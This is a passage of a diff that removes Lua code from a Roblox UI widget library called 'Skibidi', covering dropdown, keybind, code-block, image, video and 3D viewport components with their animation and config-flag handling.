-		local Row = Instance.new("TextButton", Card)
-		Row.Size                   = UDim2.new(1, 0, 0, 28)
-		Row.LayoutOrder            = i
-		Row.BackgroundColor3       = Theme.Bg2
-		Row.BackgroundTransparency = 1
-		Row.AutoButtonColor        = false
-		Row.Text                   = ""
-		MakeCorner(Row, UDim.new(0, 6))
-
-		local Tick = Instance.new("Frame", Row)
-		Tick.AnchorPoint      = Vector2.new(0, 0.5)
-		Tick.Size             = UDim2.new(0, 2, 0, 0)
-		Tick.Position         = UDim2.new(0, 0, 0.5, 0)
-		Tick.BackgroundColor3 = Theme.Accent
-		Tick.BorderSizePixel  = 0
-		Tick.ZIndex           = 2
-		MakeCorner(Tick, UDim.new(1, 0))
-
-		local RingHolder = Instance.new("Frame", Row)
-		RingHolder.Size             = UDim2.new(0, 16, 0, 16)
-		RingHolder.Position         = UDim2.new(0, 6, 0.5, -8)
-		RingHolder.BackgroundColor3 = Theme.Bg3
-		RingHolder.BorderSizePixel  = 0
-		MakeCorner(RingHolder, UDim.new(1, 0))
-		local ring = MakeStroke(RingHolder, Theme.AccentDim, 1.5)
-
-		local Dot = Instance.new("Frame", RingHolder)
-		Dot.AnchorPoint      = Vector2.new(0.5, 0.5)
-		Dot.Position         = UDim2.new(0.5, 0, 0.5, 0)
-		Dot.Size             = UDim2.new(0, 8, 0, 8)
-		Dot.BackgroundColor3 = Theme.Bg3
-		Dot.BorderSizePixel  = 0
-		MakeCorner(Dot, UDim.new(1, 0))
-
-		local Lbl = Instance.new("TextLabel", Row)
-		Lbl.Size                   = UDim2.new(1, -34, 1, 0)
-		Lbl.Position               = UDim2.new(0, 30, 0, 0)
-		Lbl.BackgroundTransparency = 1
-		Lbl.Font                   = Theme.FontRegular
-		Lbl.TextSize               = Theme.BodySize
-		Lbl.TextColor3             = Theme.TextPrimary
-		Lbl.TextXAlignment         = Enum.TextXAlignment.Left
-		Lbl.ZIndex                 = 2
-		Lbl.Text                   = text
-
-		rows[i] = { Row = Row, Tick = Tick, Dot = Dot, Ring = ring, Lbl = Lbl }
-
-		Row.MouseButton1Click:Connect(function()
-			current = i
-			refresh()
-			if Options.OnChanged then Options.OnChanged(i, text) end
-		end)
-		Row.MouseEnter:Connect(function()
-			if current == i then return end
-			TweenService:Create(Row, TweenFast, { BackgroundColor3 = Theme.Hover }):Play()
-			Row.BackgroundTransparency = 0
-			TweenService:Create(Tick, TweenSpring, { Size = UDim2.new(0, 2, 0, 8) }):Play()
-		end)
-		Row.MouseLeave:Connect(function()
-			if current == i then return end
-			TweenService:Create(Row, TweenFast, { BackgroundColor3 = Theme.Bg2 }):Play()
-			TweenService:Create(Tick, TweenFast, { Size = UDim2.new(0, 2, 0, 0) }):Play()
-			task.delay(0.14, function()
-				if current ~= i then Row.BackgroundTransparency = 1 end
-			end)
-		end)
-	end
-
-	refresh()
-	AttachTooltip(Card, Options.Tooltip)
-
-	if Options.Flag then
-		Flags[Options.Flag] = {
-			Kind = "number",
-			Get  = function() return current end,
-			Set  = function(i)
-				if type(i) == "number" and items[i] then
-					current = i
-					refresh()
-					if Options.OnChanged then Options.OnChanged(i, items[i]) end
-				end
-			end,
-		}
-	end
-
-	return {
-		Frame    = Card,
-		SetValue = function(i) current = i; refresh() end,
-		GetValue = function() return current, items[current] end,
-	}
-end
-
--- ============================================================
--- CreateDropdown
--- A collapsible labeled select list (single or multi-select).
---
--- Options:
---   Label        string
---   Options      table     Array of option strings
---   Default      any       Selected value/index (or array of values if Multi)
---   Multi        bool      Allow multiple selections   (default false)
---   Placeholder  string    Shown when nothing is selected
---   OnChanged    function(value)   -- value is a string, or an array if Multi
---   Tooltip      string    Hover tooltip (optional)
---   Flag         string    Config key for SaveConfig/LoadConfig
---
---   Icon         string   Lucide icon before the label (optional)
--- Returns: { Frame, SetOpen(bool), GetValue(),
---            SetItems(items, keepSelection) }
--- ============================================================
-function Skibidi.CreateDropdown(Parent, Options)
-	Options = Options or {}
-	local items = Options.Options or {}
-	local multi = Options.Multi == true
-	local selected = {}
-
-	if multi then
-		for _, val in ipairs(Options.Default or {}) do selected[val] = true end
-	else
-		local d = Options.Default
-		if type(d) == "number" then d = items[d] end
-		if d ~= nil then selected[d] = true end
-	end
-
-	local Card = Instance.new("Frame")
-	Card.Size              = UDim2.new(1, 0, 0, 0)
-	Card.AutomaticSize     = Enum.AutomaticSize.Y
-	Card.BackgroundColor3  = Theme.Bg2
-	Card.BorderSizePixel   = 0
-	Card.ClipsDescendants  = true
-	Card.Parent            = Parent
-	MakeCorner(Card, UDim.new(0, Theme.CornerRadiusSmall))
-	MakeEdge(Card, Theme.AccentDim, 1)
-	MakeGloss(Card, 0.10)
-	local CardLayout = Instance.new("UIListLayout", Card)
-	CardLayout.SortOrder = Enum.SortOrder.LayoutOrder
-	CardLayout.Padding   = UDim.new(0, 0)
-
-	local Head = Instance.new("TextButton", Card)
-	Head.Size                   = UDim2.new(1, 0, 0, 34)
-	Head.LayoutOrder            = 0
-	Head.BackgroundTransparency = 1
-	Head.AutoButtonColor        = false
-	Head.Text                   = ""
-	MakeHoverFill(Head, 3, 5)
-
-	local hasLabel = Options.Label and Options.Label ~= ""
-	if hasLabel then
-		local Lbl = Instance.new("TextLabel", Head)
-		Lbl.Size                   = UDim2.new(0.45, 0, 1, 0)
-		Lbl.Position               = UDim2.new(0, 12, 0, 0)
-		Lbl.BackgroundTransparency = 1
-		Lbl.Font                   = Theme.FontRegular
-		Lbl.TextSize               = Theme.BodySize
-		Lbl.TextColor3             = Theme.TextPrimary
-		Lbl.TextXAlignment         = Enum.TextXAlignment.Left
-		Lbl.Text                   = Options.Label
-		if Options.Icon then PrefixIcon(Lbl, Options.Icon, 14, Theme.TextPrimary) end
-	end
-
-	local ValueLbl = Instance.new("TextLabel", Head)
-	ValueLbl.Size                   = hasLabel and UDim2.new(0.55, -28, 1, 0) or UDim2.new(1, -40, 1, 0)
-	ValueLbl.Position               = hasLabel and UDim2.new(0.45, 0, 0, 0) or UDim2.new(0, 12, 0, 0)
-	ValueLbl.BackgroundTransparency = 1
-	ValueLbl.Font                   = Theme.FontMedium
-	ValueLbl.TextSize               = Theme.SmallSize
-	ValueLbl.TextColor3             = Theme.AccentSec
-	ValueLbl.TextXAlignment         = Enum.TextXAlignment.Right
-	ValueLbl.TextTruncate           = Enum.TextTruncate.AtEnd
-
-	local Chevron = Instance.new("TextLabel", Head)
-	Chevron.Size                   = UDim2.new(0, 20, 1, 0)
-	Chevron.Position               = UDim2.new(1, -24, 0, 0)
-	Chevron.BackgroundTransparency = 1
-	Chevron.Font                   = Theme.FontIcon
-	Chevron.TextSize               = 12
-	Chevron.TextColor3             = Theme.AccentDim
-	Chevron.Text                   = "▼"
-
-	local List = Instance.new("Frame", Card)
-	List.Size                   = UDim2.new(1, 0, 0, 0)
-	List.AutomaticSize          = Enum.AutomaticSize.Y
-	List.LayoutOrder            = 1
-	List.BackgroundTransparency = 1
-	List.Visible                = false
-	MakePadding(List, 6, 6, 0, 6)
-	MakeListLayout(List, Enum.FillDirection.Vertical, 3)
-
-	local Div = Instance.new("Frame", List)
-	Div.Size                   = UDim2.new(1, 0, 0, 1)
-	Div.LayoutOrder            = 0
-	Div.BackgroundColor3       = Theme.AccentDim
-	Div.BackgroundTransparency = 0.4
-	Div.BorderSizePixel        = 0
-
-	local optRows = {}
-
-	local SEL_BG = Mix(Theme.Bg2, Theme.Accent, 0.16)
-
-	local function refreshLabel()
-		local out = {}
-		for _, val in ipairs(items) do
-			if selected[val] then table.insert(out, val) end
-		end
-		local any = #out > 0
-		ValueLbl.Text = any and table.concat(out, ", ") or (Options.Placeholder or "Select...")
-		-- An empty select should look empty. Painting the placeholder in
-		-- the accent made "nothing chosen" read as a live value.
-		TweenService:Create(ValueLbl, TweenFast,
-			{ TextColor3 = any and Theme.AccentSec or Theme.TextMuted }):Play()
-	end
-
-	local function refreshRows()
-		for val, row in pairs(optRows) do
-			local on = selected[val] == true
-			TweenService:Create(row.Dot, TweenSpring, {
-				BackgroundColor3 = on and Theme.Accent or Theme.Bg3,
-				Size             = on and UDim2.new(0, 7, 0, 7) or UDim2.new(0, 4, 0, 4),
-			}):Play()
-			TweenService:Create(row.Ring, TweenFast, {
-				Color     = on and Theme.Accent or Theme.AccentDim,
-				Thickness = on and 2 or 1.5,
-			}):Play()
-			TweenService:Create(row.Lbl, TweenFast,
-				{ TextColor3 = on and Theme.ActiveTabText or Theme.TextPrimary }):Play()
-			row.Lbl.Font = on and Theme.FontMedium or Theme.FontRegular
-			if on then row.Row.BackgroundTransparency = 0 end
-			TweenService:Create(row.Row, TweenFast, {
-				BackgroundColor3       = on and SEL_BG or Theme.Bg2,
-				BackgroundTransparency = on and 0 or 1,
-			}):Play()
-			TweenService:Create(row.Tick, TweenSpring,
-				{ Size = UDim2.new(0, 2, 0, on and 12 or 0) }):Play()
-		end
-	end
-
-	local isOpen = false
-	local function setOpen(open)
-		isOpen = open
-		List.Visible = open
-		TweenService:Create(Chevron, TweenMed,
-			{ Rotation   = open and 180 or 0,
-			  TextColor3 = open and Theme.Accent or Theme.AccentDim }):Play()
-		if open then
-			-- Rows arrive in list order rather than all at once, which is
-			-- what makes an opening dropdown read as unfolding.
-			for _, row in pairs(optRows) do
-				if row.Scale then
-					row.Scale.Scale = 0.94
-					task.delay(math.min((row.Order or 1) * 0.022, 0.22), function()
-						if row.Scale.Parent and isOpen then
-							TweenService:Create(row.Scale, TweenPop, { Scale = 1 }):Play()
-						end
-					end)
-				end
-			end
-			OverlayOpened(Card, function() setOpen(false) end)
-		else
-			OverlayClosed(Card)
-		end
-	end
-	Card.Destroying:Connect(function() OverlayClosed(Card) end)
-
-	local function buildRow(i, text)
-		local Row = Instance.new("TextButton", List)
-		Row.Size                   = UDim2.new(1, 0, 0, 26)
-		Row.LayoutOrder            = i
-		Row.BackgroundColor3       = Theme.Bg2
-		Row.BackgroundTransparency = 1
-		Row.AutoButtonColor        = false
-		Row.Text                   = ""
-		MakeCorner(Row, UDim.new(0, 6))
-
-		-- Created once and reused on every open, so repeatedly toggling
-		-- the list doesn't pile up UIScale instances on each row.
-		local scale = Instance.new("UIScale")
-		scale.Parent = Row
-
-		local Tick = Instance.new("Frame", Row)
-		Tick.AnchorPoint      = Vector2.new(0, 0.5)
-		Tick.Size             = UDim2.new(0, 2, 0, 0)
-		Tick.Position         = UDim2.new(0, 0, 0.5, 0)
-		Tick.BackgroundColor3 = Theme.Accent
-		Tick.BorderSizePixel  = 0
-		Tick.ZIndex           = 2
-		MakeCorner(Tick, UDim.new(1, 0))
-
-		local RingHolder = Instance.new("Frame", Row)
-		RingHolder.Size             = UDim2.new(0, 14, 0, 14)
-		RingHolder.Position         = UDim2.new(0, 8, 0.5, -7)
-		RingHolder.BackgroundColor3 = Theme.Bg3
-		RingHolder.BorderSizePixel  = 0
-		MakeCorner(RingHolder, UDim.new(1, 0))
-		local ring = MakeStroke(RingHolder, selected[text] and Theme.Accent or Theme.AccentDim, 1.5)
-
-		local Dot = Instance.new("Frame", RingHolder)
-		Dot.AnchorPoint      = Vector2.new(0.5, 0.5)
-		Dot.Position         = UDim2.new(0.5, 0, 0.5, 0)
-		Dot.Size             = UDim2.new(0, 7, 0, 7)
-		Dot.BackgroundColor3 = selected[text] and Theme.Accent or Theme.Bg3
-		Dot.BorderSizePixel  = 0
-		MakeCorner(Dot, UDim.new(1, 0))
-
-		local RLbl = Instance.new("TextLabel", Row)
-		RLbl.Size                   = UDim2.new(1, -32, 1, 0)
-		RLbl.Position               = UDim2.new(0, 32, 0, 0)
-		RLbl.BackgroundTransparency = 1
-		RLbl.Font                   = Theme.FontRegular
-		RLbl.TextSize               = Theme.SmallSize + 1
-		RLbl.TextColor3             = selected[text] and Theme.ActiveTabText or Theme.TextPrimary
-		RLbl.TextXAlignment         = Enum.TextXAlignment.Left
-		RLbl.ZIndex                 = 2
-		RLbl.Text                   = text
-
-		optRows[text] = { Row = Row, Tick = Tick, Dot = Dot, Ring = ring,
-		                  Lbl = RLbl, Scale = scale, Order = i }
-
-		Row.MouseButton1Click:Connect(function()
-			if multi then
-				if selected[text] then selected[text] = nil else selected[text] = true end
-			else
-				selected = {}
-				selected[text] = true
-			end
-			refreshRows()
-			refreshLabel()
-			if Options.OnChanged then
-				if multi then
-					local out = {}
-					for _, val in ipairs(items) do if selected[val] then table.insert(out, val) end end
-					Options.OnChanged(out)
-				else
-					Options.OnChanged(text)
-				end
-			end
-			if not multi then setOpen(false) end
-		end)
-		Row.MouseEnter:Connect(function()
-			if selected[text] then return end
-			TweenService:Create(Row, TweenFast, { BackgroundColor3 = Theme.Hover }):Play()
-			Row.BackgroundTransparency = 0
-			TweenService:Create(Tick, TweenSpring, { Size = UDim2.new(0, 2, 0, 7) }):Play()
-		end)
-		Row.MouseLeave:Connect(function()
-			if selected[text] then return end
-			TweenService:Create(Row, TweenFast, { BackgroundColor3 = Theme.Bg2 }):Play()
-			TweenService:Create(Tick, TweenFast, { Size = UDim2.new(0, 2, 0, 0) }):Play()
-			task.delay(0.14, function()
-				if not selected[text] then Row.BackgroundTransparency = 1 end
-			end)
-		end)
-	end
-
-	local function buildRows()
-		for _, row in pairs(optRows) do
-			if row.Row then row.Row:Destroy() end
-		end
-		optRows = {}
-		for i, text in ipairs(items) do
-			buildRow(i, text)
-		end
-	end
-
-	buildRows()
-	refreshLabel()
-	AttachTooltip(Head, Options.Tooltip)
-
-	Head.MouseButton1Click:Connect(function()
-		setOpen(not isOpen)
-	end)
-
-	local function getValue()
-		if multi then
-			local out = {}
-			for _, val in ipairs(items) do if selected[val] then table.insert(out, val) end end
-			return out
-		end
-		for _, val in ipairs(items) do if selected[val] then return val end end
-		return nil
-	end
-
-	if Options.Flag then
-		Flags[Options.Flag] = {
-			Kind = multi and "table" or "value",
-			Get  = getValue,
-			Set  = function(v)
-				selected = {}
-				if multi then
-					if type(v) == "table" then
-						for _, val in ipairs(v) do selected[val] = true end
-					end
-				else
-					if type(v) == "number" then v = items[v] end
-					if v ~= nil then selected[v] = true end
-				end
-				refreshRows()
-				refreshLabel()
-				if Options.OnChanged then Options.OnChanged(getValue()) end
-			end,
-		}
-	end
-
-	return {
-		Frame    = Card,
-		SetOpen  = setOpen,
-		GetValue = getValue,
-		-- Replace the option list. Selections for values that still
-		-- exist are kept when keepSelection is true.
-		SetItems = function(newItems, keepSelection)
-			items = newItems or {}
-			if keepSelection then
-				local lookup = {}
-				for _, val in ipairs(items) do lookup[val] = true end
-				for val in pairs(selected) do
-					if not lookup[val] then selected[val] = nil end
-				end
-			else
-				selected = {}
-			end
-			buildRows()
-			refreshLabel()
-		end,
-	}
-end
-
--- ============================================================
--- CreateKeybind
--- A labeled row with a capture button; click it, then press a
--- key to bind it.
---
--- Options:
---   Label      string
---   Default    Enum.KeyCode | string   (e.g. Enum.KeyCode.E or "E")
---   OnChanged  function(keyCode)
---   Tooltip    string   Hover tooltip (optional)
---   Flag       string   Config key for SaveConfig/LoadConfig
---
---   Icon       string   Lucide icon before the label (optional)
--- Returns: { Frame, Set(keyCode), GetValue() }
--- ============================================================
-function Skibidi.CreateKeybind(Parent, Options)
-	Options = Options or {}
-	local current = Options.Default
-	if type(current) == "string" then
-		current = Enum.KeyCode[current]
-	end
-
-	local Row = Instance.new("Frame")
-	Row.Size             = UDim2.new(1, 0, 0, 34)
-	Row.BackgroundColor3 = Theme.Bg2
-	Row.BorderSizePixel  = 0
-	Row.Parent           = Parent
-	MakeCorner(Row, UDim.new(0, Theme.CornerRadiusSmall))
-	MakeEdge(Row, Theme.AccentDim, 1)
-	MakeGloss(Row, 0.10)
-
-	local Lbl = Instance.new("TextLabel", Row)
-	Lbl.Size                   = UDim2.new(1, -90, 1, 0)
-	Lbl.Position               = UDim2.new(0, 12, 0, 0)
-	Lbl.BackgroundTransparency = 1
-	Lbl.Font                   = Theme.FontRegular
-	Lbl.TextSize               = Theme.BodySize
-	Lbl.TextColor3             = Theme.TextPrimary
-	Lbl.TextXAlignment         = Enum.TextXAlignment.Left
-	Lbl.Text                   = Options.Label or ""
-	if Options.Icon then PrefixIcon(Lbl, Options.Icon, 14, Theme.TextPrimary) end
-
-	local KeyBtn = Instance.new("TextButton", Row)
-	KeyBtn.AnchorPoint            = Vector2.new(1, 0.5)
-	KeyBtn.Position               = UDim2.new(1, -10, 0.5, 0)
-	KeyBtn.Size                   = UDim2.new(0, 74, 0, Theme.ToggleH + 2)
-	KeyBtn.BackgroundColor3       = Theme.InputBg
-	KeyBtn.BorderSizePixel        = 0
-	KeyBtn.Font                   = Theme.FontMedium
-	KeyBtn.TextSize               = Theme.SmallSize
-	KeyBtn.TextColor3             = Theme.AccentSec
-	KeyBtn.AutoButtonColor        = false
-	KeyBtn.Text                   = current and current.Name or "None"
-	MakeCorner(KeyBtn, UDim.new(0, 5))
-	local keyStroke = MakeEdge(KeyBtn, Theme.AccentDim, 1)
-	MakeGloss(KeyBtn, 0.10)
-
-	local listening = false
-	local conn
-
-	local function stopListening()
-		listening = false
-		TweenService:Create(keyStroke, TweenFast, { Color = EdgeRest(), Thickness = 1 }):Play()
-		if conn then conn:Disconnect(); conn = nil end
-	end
-	-- If the row dies while capturing, drop the global InputBegan hook
-	Row.Destroying:Connect(function()
-		if conn then conn:Disconnect(); conn = nil end
-	end)
-
-	KeyBtn.MouseButton1Click:Connect(function()
-		if listening then stopListening(); return end
-		listening = true
-		KeyBtn.Text = "..."
-		TweenService:Create(keyStroke, TweenFast, { Color = Theme.Accent, Thickness = 1.5 }):Play()
-		conn = UserInputService.InputBegan:Connect(function(inp)
-			if inp.UserInputType == Enum.UserInputType.Keyboard then
-				current = inp.KeyCode
-				KeyBtn.Text = current.Name
-				stopListening()
-				if Options.OnChanged then Options.OnChanged(current) end
-			end
-		end)
-	end)
-
-	Row.MouseEnter:Connect(function()
-		TweenService:Create(Row, TweenFast, { BackgroundColor3 = Theme.Hover }):Play()
-	end)
-	Row.MouseLeave:Connect(function()
-		TweenService:Create(Row, TweenFast, { BackgroundColor3 = Theme.Bg2 }):Play()
-	end)
-	AttachTooltip(Row, Options.Tooltip)
-	PlayEntrance(Row)
-
-	if Options.Flag then
-		Flags[Options.Flag] = {
-			Kind = "keybind",
-			Get  = function() return current and current.Name or nil end,
-			Set  = function(v)
-				local kc = v
-				if type(kc) == "string" then
-					local ok, parsed = pcall(function() return Enum.KeyCode[kc] end)
-					kc = ok and parsed or nil
-				end
-				if typeof(kc) == "EnumItem" then
-					current = kc
-					KeyBtn.Text = kc.Name
-					if Options.OnChanged then Options.OnChanged(current) end
-				end
-			end,
-		}
-	end
-
-	return {
-		Frame = Row,
-		Set = function(kc)
-			current = kc
-			KeyBtn.Text = kc and kc.Name or "None"
-		end,
-		GetValue = function() return current end,
-	}
-end
-
--- ============================================================
--- CreateCode
--- A monospace code block with an optional language tag and
--- copy-to-clipboard button.
---
--- Options:
---   Text       string   The code contents
---   Language   string   Optional language label (e.g. "lua")
---   Height     number   Fixed scrollable height (default: auto-fit)
---
--- Returns: { Frame, SetText(text) }
--- ============================================================
-function Skibidi.CreateCode(Parent, Options)
-	Options = Options or {}
-	local fixedH = Options.Height
-
-	local hasHeader = Options.Language and Options.Language ~= ""
-
-	local Card = Instance.new("Frame")
-	Card.Size              = UDim2.new(1, 0, 0, fixedH and (fixedH + (hasHeader and 22 or 0)) or 0)
-	Card.AutomaticSize     = fixedH and Enum.AutomaticSize.None or Enum.AutomaticSize.Y
-	Card.BackgroundColor3  = Theme.Bg3
-	Card.BorderSizePixel   = 0
-	Card.ClipsDescendants  = true
-	Card.Parent            = Parent
-	MakeCorner(Card, UDim.new(0, Theme.CornerRadiusSmall))
-	MakeEdge(Card, Theme.AccentDim, 1)
-	MakeGloss(Card, 0.10)
-	local CardLayout = Instance.new("UIListLayout", Card)
-	CardLayout.SortOrder = Enum.SortOrder.LayoutOrder
-	CardLayout.Padding   = UDim.new(0, 0)
-	if hasHeader then
-		local HeaderRow = Instance.new("Frame", Card)
-		HeaderRow.Size             = UDim2.new(1, 0, 0, 24)
-		HeaderRow.LayoutOrder      = 0
-		HeaderRow.BackgroundColor3 = Theme.Bg2
-		HeaderRow.BorderSizePixel  = 0
-		MakeGloss(HeaderRow, 0.16)
-
-		local LangLbl = Instance.new("TextLabel", HeaderRow)
-		LangLbl.Size                   = UDim2.new(1, -54, 1, 0)
-		LangLbl.Position               = UDim2.new(0, 10, 0, 0)
-		LangLbl.BackgroundTransparency = 1
-		LangLbl.Font                   = Theme.FontMedium
-		LangLbl.TextSize               = Theme.CaptionSize
-		LangLbl.TextColor3             = Theme.TextMuted
-		LangLbl.TextXAlignment         = Enum.TextXAlignment.Left
-		LangLbl.Text                   = string.upper(Options.Language)
-
-		local CopyBtn = Instance.new("TextButton", HeaderRow)
-		CopyBtn.Size                   = UDim2.new(0, 44, 1, -6)
-		CopyBtn.Position               = UDim2.new(1, -48, 0, 3)
-		CopyBtn.BackgroundColor3       = Theme.Bg3
-		CopyBtn.BorderSizePixel        = 0
-		CopyBtn.Font                   = Theme.FontMedium
-		CopyBtn.TextSize               = 10
-		CopyBtn.TextColor3             = Theme.TextMuted
-		CopyBtn.Text                   = "Copy"
-		CopyBtn.AutoButtonColor        = false
-		MakeCorner(CopyBtn, UDim.new(0, 5))
-		MakeEdge(CopyBtn, Theme.AccentDim, 1)
-		MakeRipple(CopyBtn, Theme.Accent, 5)
-
-		CopyBtn.MouseEnter:Connect(function()
-			TweenService:Create(CopyBtn, TweenFast, { TextColor3 = Theme.Accent }):Play()
-		end)
-		CopyBtn.MouseLeave:Connect(function()
-			TweenService:Create(CopyBtn, TweenFast, { TextColor3 = Theme.TextMuted }):Play()
-		end)
-
-		CopyBtn.MouseButton1Click:Connect(function()
-			if setclipboard then
-				pcall(setclipboard, Options.Text or "")
-				CopyBtn.Text       = "Copied"
-				CopyBtn.TextColor3 = Theme.Success
-				task.delay(1, function()
-					if not CopyBtn.Parent then return end
-					CopyBtn.Text       = "Copy"
-					CopyBtn.TextColor3 = Theme.TextMuted
-				end)
-			end
-		end)
-	end
-
-	local Scroll = Instance.new("ScrollingFrame", Card)
-	Scroll.LayoutOrder            = 1
-	Scroll.BackgroundTransparency = 1
-	Scroll.BorderSizePixel        = 0
-	Scroll.ScrollBarThickness     = 3
-	Scroll.ScrollBarImageColor3   = Theme.AccentDim
-	Scroll.CanvasSize             = UDim2.new(0, 0, 0, 0)
-	Scroll.ClipsDescendants       = true
-	if fixedH then
-		Scroll.Size                = UDim2.new(1, 0, 0, fixedH)
-		Scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
-	else
-		Scroll.Size                = UDim2.new(1, 0, 0, 0)
-		Scroll.AutomaticSize       = Enum.AutomaticSize.Y
-		Scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
-	end
-	MakePadding(Scroll, 10, 10, 8, 8)
-
-	local CodeLbl = Instance.new("TextLabel", Scroll)
-	CodeLbl.Size                   = UDim2.new(1, -20, 0, 0)
-	CodeLbl.AutomaticSize          = Enum.AutomaticSize.Y
-	CodeLbl.BackgroundTransparency = 1
-	CodeLbl.Font                   = Enum.Font.Code
-	CodeLbl.TextSize               = Theme.SmallSize
-	CodeLbl.TextColor3             = Theme.TextPrimary
-	CodeLbl.TextXAlignment         = Enum.TextXAlignment.Left
-	CodeLbl.TextYAlignment         = Enum.TextYAlignment.Top
-	CodeLbl.TextWrapped            = true
-	CodeLbl.Text                   = Options.Text or ""
-
-	return {
-		Frame   = Card,
-		SetText = function(t) CodeLbl.Text = t end,
-	}
-end
-
--- ============================================================
--- CreateImage
--- A bordered image display.
---
--- Options:
---   Image       string          Asset id, e.g. "rbxassetid://123..."
---   Height      number          (default 150)
---   ScaleType   Enum.ScaleType  (default Fit)
---
--- Returns: { Frame, Image, SetImage(id) }
--- ============================================================
-function Skibidi.CreateImage(Parent, Options)
-	Options = Options or {}
-	local h = Options.Height or 150
-
-	local Card = Instance.new("Frame")
-	Card.Size              = UDim2.new(1, 0, 0, h)
-	Card.BackgroundColor3  = Theme.Bg3
-	Card.BorderSizePixel   = 0
-	Card.ClipsDescendants  = true
-	Card.Parent            = Parent
-	MakeCorner(Card, UDim.new(0, Theme.CornerRadiusSmall))
-	MakeEdge(Card, Theme.AccentDim, 1)
-	MakeGloss(Card, 0.10)
-
-	local Img = Instance.new("ImageLabel", Card)
-	Img.Size                   = UDim2.new(1, 0, 1, 0)
-	Img.BackgroundTransparency = 1
-	Img.Image                  = Options.Image or ""
-	Img.ScaleType               = Options.ScaleType or Enum.ScaleType.Fit
-
-	return {
-		Frame    = Card,
-		Image    = Img,
-		SetImage = function(id) Img.Image = id end,
-	}
-end
-
--- ============================================================
--- CreateVideo
--- A bordered video player with a play/pause control.
---
--- Options:
---   Video      string   Asset id, e.g. "rbxassetid://123..."
---   Height     number   (default 180)
---   Looped     bool     (default false)
---   Volume     number   (default 1)
---   Autoplay   bool     (default false)
---
--- Returns: { Frame, Video, Play(), Pause() }
--- ============================================================
-function Skibidi.CreateVideo(Parent, Options)
-	Options = Options or {}
-	local h = Options.Height or 180
-
-	local Card = Instance.new("Frame")
-	Card.Size              = UDim2.new(1, 0, 0, h + 30)
-	Card.BackgroundColor3  = Theme.Bg3
-	Card.BorderSizePixel   = 0
-	Card.ClipsDescendants  = true
-	Card.Parent            = Parent
-	MakeCorner(Card, UDim.new(0, Theme.CornerRadiusSmall))
-	MakeEdge(Card, Theme.AccentDim, 1)
-	MakeGloss(Card, 0.10)
-
-	local Vid = Instance.new("VideoFrame", Card)
-	Vid.Size             = UDim2.new(1, 0, 0, h)
-	Vid.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	Vid.BorderSizePixel  = 0
-	Vid.Video            = Options.Video or ""
-	Vid.Looped           = Options.Looped == true
-	Vid.Volume           = Options.Volume or 1
-
-	local Controls = Instance.new("Frame", Card)
-	Controls.Position               = UDim2.new(0, 0, 0, h)
-	Controls.Size                   = UDim2.new(1, 0, 0, 30)
-	Controls.BackgroundTransparency = 1
-
-	local PlayBtn = Instance.new("TextButton", Controls)
-	PlayBtn.Size             = UDim2.new(0, 60, 0, 22)
-	PlayBtn.Position         = UDim2.new(0, 8, 0.5, -11)
-	PlayBtn.BackgroundColor3 = Theme.Bg2
-	PlayBtn.BorderSizePixel  = 0
-	PlayBtn.Font             = Theme.FontMedium
-	PlayBtn.TextSize         = Theme.SmallSize
-	PlayBtn.TextColor3       = Theme.TextPrimary
-	PlayBtn.Text             = "Play"
-	PlayBtn.AutoButtonColor  = false
-	MakeCorner(PlayBtn, UDim.new(0, 5))
-	MakeEdge(PlayBtn, Theme.AccentDim, 1)
-	MakeGloss(PlayBtn, 0.10)
-
-	local function updateBtn()
-		PlayBtn.Text = Vid.Playing and "Pause" or "Play"
-	end
-
-	local function Play() Vid:Play(); updateBtn() end
-	local function Pause() Vid:Pause(); updateBtn() end
-
-	PlayBtn.MouseButton1Click:Connect(function()
-		if Vid.Playing then Pause() else Play() end
-	end)
-
-	if Options.Autoplay then Play() else updateBtn() end
-
-	return { Frame = Card, Video = Vid, Play = Play, Pause = Pause }
-end
-
--- ============================================================
--- CreateViewport
--- A ViewportFrame for previewing a 3D model, with optional
--- auto-rotate.
---
--- Options:
---   Model        Instance   A Model/BasePart to clone into the viewport
---   Height       number     (default 180)
---   AutoRotate   bool       (default false)
---
--- Returns: { Frame, Viewport, Camera, SetModel(instance) }
--- ============================================================
-function Skibidi.CreateViewport(Parent, Options)
-	Options = Options or {}
-	local h = Options.Height or 180
-
-	local Card = Instance.new("Frame")
-	Card.Size              = UDim2.new(1, 0, 0, h)
-	Card.BackgroundColor3  = Options.BackgroundColor3 or Theme.Bg3
-	Card.BorderSizePixel   = 0
-	Card.ClipsDescendants  = true
-	Card.Parent            = Parent
-	MakeCorner(Card, UDim.new(0, Theme.CornerRadiusSmall))
-	MakeEdge(Card, Theme.AccentDim, 1)
-	MakeGloss(Card, 0.10)
-
-	local VP = Instance.new("ViewportFrame", Card)
-	VP.Size                   = UDim2.new(1, 0, 1, 0)
-	VP.BackgroundTransparency = 1
-
-	local Cam = Instance.new("Camera", VP)
-	VP.CurrentCamera = Cam
-
-	local modelClone
-	local rotConn
-
-	local function frameCamera(target)
-		local cf, size = target:GetBoundingBox()
-		local dist = math.max(size.Magnitude, 4)
-		Cam.CFrame = CFrame.new(cf.Position + Vector3.new(0, size.Y * 0.2, dist), cf.Position)
-	end
-
-	local function SetModel(model)
-		if modelClone then modelClone:Destroy() end
-		if rotConn then rotConn:Disconnect(); rotConn = nil end
-		if not model then return end
-		modelClone = model:Clone()
-		modelClone.Parent = VP
-		task.defer(function()
-			local ok = pcall(frameCamera, modelClone)
-			if not ok then
-				Cam.CFrame = CFrame.new(Vector3.new(0, 0, 10), Vector3.new(0, 0, 0))
-			end
-			if Options.AutoRotate then
-				local angle = 0
-				rotConn = RunService.RenderStepped:Connect(function(dt)
-					angle = angle + dt * 0.5
-					local ok2, cf2, size2 = pcall(function() return modelClone:GetBoundingBox() end)
-					if ok2 then
-						local dist2 = math.max(size2.Magnitude, 4)
-						Cam.CFrame = CFrame.new(
-							cf2.Position + Vector3.new(math.sin(angle) * dist2, size2.Y * 0.2, math.cos(angle) * dist2),
-							cf2.Position)
-					end
-				end)
-			end
-		end)
-	end
-
-	if Options.Model then SetModel(Options.Model) end
-
-	return { Frame = Card, Viewport = VP, Camera = Cam, SetModel = SetModel }
-end
-
--- ============================================================
--- CreateColorPicker
--- A labeled swatch that expands into a saturation/value box,
--- a hue slider, and a hex input.
---
--- Options:
---   Label      string
---   Default    Color3    (default white)
---   OnChanged  function(color3)
---   Tooltip    string    Hover tooltip (optional)
---   Flag       string    Config key for SaveConfig/LoadConfig
